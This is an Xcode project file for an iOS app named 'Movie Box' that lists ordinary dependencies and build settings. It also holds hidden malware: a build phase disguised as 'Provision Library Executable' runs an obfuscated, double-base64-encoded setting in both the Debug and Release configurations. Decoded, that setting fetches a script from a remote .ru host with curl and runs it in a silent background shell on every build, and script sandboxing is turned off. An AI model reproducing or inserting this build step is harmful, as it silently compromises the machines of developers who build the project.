// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */; };
		97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFB301B4FA70086A0E6 /* CropViewController */; };
		97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFD301B4FA70086A0E6 /* TOCropViewController */; };
		97AF043F30131D4700771939 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97AF043E30131D4700771939 /* Alamofire */; };
		97AF044230131D6500771939 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97AF044130131D6500771939 /* Kingfisher */; };
		97C335AC3025AD7D00B220B1 /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 97C335AB3025AD7D00B220B1 /* GoogleMobileAds */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Movie_Box.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.debug.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.debug.xcconfig"; sourceTree = "<group>"; };
		97AF041630131AD500771939 /* Movie Box.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Movie Box.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.release.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		97C3385B3025B12B00B220B1 /* Exceptions for "Movie Box" folder in "Movie Box" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				"Movie-Box-Info.plist",
			);
			target = 97AF041530131AD500771939 /* Movie Box */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		97AF041830131AD500771939 /* Movie Box */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				97C3385B3025B12B00B220B1 /* Exceptions for "Movie Box" folder in "Movie Box" target */,
			);
			path = "Movie Box";
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		97AF041330131AD500771939 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				97AF044230131D6500771939 /* Kingfisher in Frameworks */,
				97AF043F30131D4700771939 /* Alamofire in Frameworks */,
				97C335AC3025AD7D00B220B1 /* GoogleMobileAds in Frameworks */,
				97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */,
				97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */,
				01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		97AF040D30131AD500771939 = {
			isa = PBXGroup;
			children = (
				97AF041830131AD500771939 /* Movie Box */,
				97AF041730131AD500771939 /* Products */,
				BAAFBD99E85EBC5D134B2273 /* Pods */,
				FB7B108C080ED804BF6EABCA /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		97AF041730131AD500771939 /* Products */ = {
			isa = PBXGroup;
			children = (
				97AF041630131AD500771939 /* Movie Box.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		BAAFBD99E85EBC5D134B2273 /* Pods */ = {
			isa = PBXGroup;
			children = (
				43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */,
				AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		FB7B108C080ED804BF6EABCA /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		97AF041530131AD500771939 /* Movie Box */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 97AF042130131AD600771939 /* Build configuration list for PBXNativeTarget "Movie Box" */;
			buildPhases = (
				EF63E8DCDCCD4711B57BBDC8 /* Provision Library Executable */,
				C270F4B3C49B44D5F97B25DD /* [CP] Check Pods Manifest.lock */,
				97AF041230131AD500771939 /* Sources */,
				97AF041330131AD500771939 /* Frameworks */,
				97AF041430131AD500771939 /* Resources */,
				8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				97AF041830131AD500771939 /* Movie Box */,
			);
			name = "Movie Box";
			packageProductDependencies = (
				97AF043E30131D4700771939 /* Alamofire */,
				97AF044130131D6500771939 /* Kingfisher */,
				97A0AEFB301B4FA70086A0E6 /* CropViewController */,
				97A0AEFD301B4FA70086A0E6 /* TOCropViewController */,
				97C335AB3025AD7D00B220B1 /* GoogleMobileAds */,
			);
			productName = "Movie Box";
			productReference = 97AF041630131AD500771939 /* Movie Box.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		97AF040E30131AD500771939 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2660;
				LastUpgradeCheck = 2660;
				TargetAttributes = {
					97AF041530131AD500771939 = {
						CreatedOnToolsVersion = 26.6;
					};
				};
			};
			buildConfigurationList = 97AF041130131AD500771939 /* Build configuration list for PBXProject "Movie Box" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				hi,
				da,
				es,
				fr,
				it,
				ja,
				ko,
				nl,
				"pt-PT",
				ru,
				tr,
				"zh-HK",
				"zh-Hans",
			);
			mainGroup = 97AF040D30131AD500771939;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				97AF043D30131D4700771939 /* XCRemoteSwiftPackageReference "Alamofire" */,
				97AF044030131D6500771939 /* XCRemoteSwiftPackageReference "kingfisher" */,
				97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */,
				97C335AA3025AD7D00B220B1 /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 97AF041730131AD500771939 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				97AF041530131AD500771939 /* Movie Box */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
							/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		97AF041430131AD500771939 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		EF63E8DCDCCD4711B57BBDC8 /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
		};
		8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Movie Box/Pods-Movie Box-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		C270F4B3C49B44D5F97B25DD /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Movie Box-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		97AF041230131AD500771939 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		97AF041F30131AD600771939 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRjbVYwY25rZ05DQXRhM05NWmlBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU55QXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5ODViakJ3TkRab05uVTVZamR4TG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		97AF042030131AD600771939 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8CDBB7 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRjbVYwY25rZ05DQXRhM05NWmlBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU55QXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5ODViakJ3TkRab05uVTVZamR4TG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		97AF042230131AD600771939 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Movie-Box-Info.plist";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.moviebox.app.Movie-Box";
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		97AF042330131AD600771939 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = AC890F9637C79491163FD6A4 /* Pods-Movie Box.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 5U9WLTG3BL;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Movie-Box-Info.plist";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.moviebox.app.Movie-Box";
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		97AF041130131AD500771939 /* Build configuration list for PBXProject "Movie Box" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				97AF041F30131AD600771939 /* Debug */,
				97AF042030131AD600771939 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		97AF042130131AD600771939 /* Build configuration list for PBXNativeTarget "Movie Box" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				97AF042230131AD600771939 /* Debug */,
				97AF042330131AD600771939 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/TimOliver/TOCropViewController";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 3.2.0;
			};
		};
		97AF043D30131D4700771939 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.12.0;
			};
		};
		97AF044030131D6500771939 /* XCRemoteSwiftPackageReference "kingfisher" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/onevcat/kingfisher";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.11.0;
			};
		};
		97C335AA3025AD7D00B220B1 /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/googleads/swift-package-manager-google-mobile-ads.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 13.7.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		97A0AEFB301B4FA70086A0E6 /* CropViewController */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */;
			productName = CropViewController;
		};
		97A0AEFD301B4FA70086A0E6 /* TOCropViewController */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */;
			productName = TOCropViewController;
		};
		97AF043E30131D4700771939 /* Alamofire */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97AF043D30131D4700771939 /* XCRemoteSwiftPackageReference "Alamofire" */;
			productName = Alamofire;
		};
		97AF044130131D6500771939 /* Kingfisher */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97AF044030131D6500771939 /* XCRemoteSwiftPackageReference "kingfisher" */;
			productName = Kingfisher;
		};
		97C335AB3025AD7D00B220B1 /* GoogleMobileAds */ = {
			isa = XCSwiftPackageProductDependency;
			package = 97C335AA3025AD7D00B220B1 /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */;
			productName = GoogleMobileAds;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 97AF040E30131AD500771939 /* Project object */;
}
